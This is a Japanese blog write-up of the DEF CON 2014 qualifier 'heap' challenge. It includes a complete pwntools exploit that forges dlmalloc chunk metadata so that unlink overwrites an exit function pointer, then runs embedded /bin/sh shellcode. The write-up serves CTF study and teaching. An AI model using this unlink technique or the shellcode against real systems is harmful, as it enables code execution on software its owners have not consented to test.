---
layout: post
alias: "/blog/2016/03/18/defcon-qualifier-ctf-2014-heap/"
date: 2016-03-18T22:26:56+09:00
tags: [ "ctf", "writeup", "pwn", "heap", "heap-metadata", "shellcode" ]
---

# DEF CON CTF Qualifier 2014: heap

同じような問題を以前解いた([Exploit Exercises Protostar Heap3](http://kimiyuki.net/blog/2016/02/04/exploit-exercises-protostar-heap3/))ので、これと同じことをした。

## [heap](https://github.com/ctfs/write-ups-2014/tree/master/def-con-ctf-qualifier-2014/heap)

### 準備

書き換えるべきfunction pointerと、executableなheap、freeされるたくさんのchunksが与えられる。unlinkの際の双方向listの繋ぎ変えを用いて書き込みを行う。

``` sh
$ ./heap

Welcome to your first heap overflow...
I am going to allocate 20 objects...
Using Dougle Lee Allocator 2.6.1...
Goodluck!

Exit function pointer is at 804C8AC address.
[ALLOC][loc=9471008][size=1246]
[ALLOC][loc=94714F0][size=1121]
[ALLOC][loc=9471958][size=947]
[ALLOC][loc=9471D10][size=741]
[ALLOC][loc=9472000][size=706]
[ALLOC][loc=94722C8][size=819]
[ALLOC][loc=9472600][size=673]
[ALLOC][loc=94728A8][size=1004]
[ALLOC][loc=9472C98][size=952]
[ALLOC][loc=9473058][size=755]
[ALLOC][loc=9473350][size=260]
[ALLOC][loc=9473458][size=877]
[ALLOC][loc=94737D0][size=1245]
[ALLOC][loc=9473CB8][size=1047]
[ALLOC][loc=94740D8][size=1152]
[ALLOC][loc=9474560][size=1047]
[ALLOC][loc=9474980][size=1059]
[ALLOC][loc=9474DA8][size=906]
[ALLOC][loc=9475138][size=879]
[ALLOC][loc=94754B0][size=823]
Write to object [size=260]:
AAAA
Copied 5 bytes.
[FREE][address=9471008]
[FREE][address=94714F0]
[FREE][address=9471958]
[FREE][address=9471D10]
[FREE][address=9472000]
[FREE][address=94722C8]
[FREE][address=9472600]
[FREE][address=94728A8]
[FREE][address=9472C98]
[FREE][address=9473058]
[FREE][address=9473350]
[FREE][address=9473458]
[FREE][address=94737D0]
[FREE][address=9473CB8]
[FREE][address=94740D8]
[FREE][address=9474560]
[FREE][address=9474980]
[FREE][address=9474DA8]
[FREE][address=9475138]
[FREE][address=94754B0]
Did you forget to read the flag with your shellcode?
Exiting
```

``` sh
$ readelf -s heap
    19: 080492e5   566 FUNC    GLOBAL DEFAULT   13 free
    24: 08048ca7  1598 FUNC    GLOBAL DEFAULT   13 malloc
```

``` sh
$ checksec --file heap
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   heap
```

### 実装

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
# parser.add_argument('host')
# parser.add_argument('port', type=int)
args = parser.parse_args()
context.log_level = 'debug'

p = process('./heap')
p.recvuntil('Exit function pointer is at ')
exit_function_pointer = int(p.recvuntil(' ').strip(), 16)
p.recvline()
loc, size = [], []
for i in range(20):
    s = p.recvline()
    m = re.match('\[ALLOC\]\[loc=([0-9A-F]+)\]\[size=([0-9]+)\]', s)
    loc.append(int(m.group(1), 16))
    size.append(int(m.group(2)))
p.recvuntil('Write to object [size=')
x = size.index(int(p.recvuntil(']')[:-1]))
real_chunk_size = [loc[i+1] - loc[i] for i in range(len(loc) - 1)]

# NOTE: heap is executable
PREV_INUSE = 0x1
# metasploit
#     $ msfconsole
#     msf > use payload/linux/x86/exec
#     msf payload(exec) > generate -o CMD=/bin/sh
shellcode = \
    "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73" + \
    "\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00" + \
    "\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd" + \
    "\x80"

payload = []

# real chunk, malloc(260)
payload.append('')
payload[0] += 'AAAA'
payload[0] += 'AAAA'
shellcode_pointer = loc[x] + len(payload[0])
payload[0] += "\x90\x90\x90\x90" # nop
payload[0] += "\xeb\x06" + 'AA' # short jump
payload[0] += 'AAAA' # BK->fd, written as a side effect
payload[0] += shellcode
payload[0] += 'A' * (real_chunk_size[x] - 4 - len(payload[0]))

# real chunk, malloc(877)
chunk_size = 0x50
payload.append('')
payload[1] += p32(chunk_size + PREV_INUSE)
payload[1] += 'B' * (chunk_size - len(payload[1]))

prev_chunk_size = chunk_size
chunk_size = 0x50
next_chunk_size = 0x50
payload.append('')
payload[2] += p32(chunk_size + PREV_INUSE)
payload[2] += 'C' * (real_chunk_size[x+1] - prev_chunk_size - len(payload[2]) - next_chunk_size)

# will be consolidated
chunk_size = next_chunk_size
payload.append('')
payload[3] += p32(chunk_size + PREV_INUSE)
payload[3] += p32(exit_function_pointer - 0x8) # fd
payload[3] += p32(shellcode_pointer) # bk
payload[3] += 'C' * (chunk_size - len(payload[3]) - 4)
payload[3] += p32(chunk_size) # prev_size of the next chunk

# real chunk, malloc(1245)
chunk_size = real_chunk_size[x+2]
payload.append('')
payload[4] += p32(chunk_size) # not PREV_INUSE

payload = ''.join(payload)

log.info('exit function pointer: ' + hex(exit_function_pointer))
log.info('shellcode pointer: ' + hex(shellcode_pointer))

p.sendline(payload)
time.sleep(0.5)
p.sendline('id')
p.interactive()
```
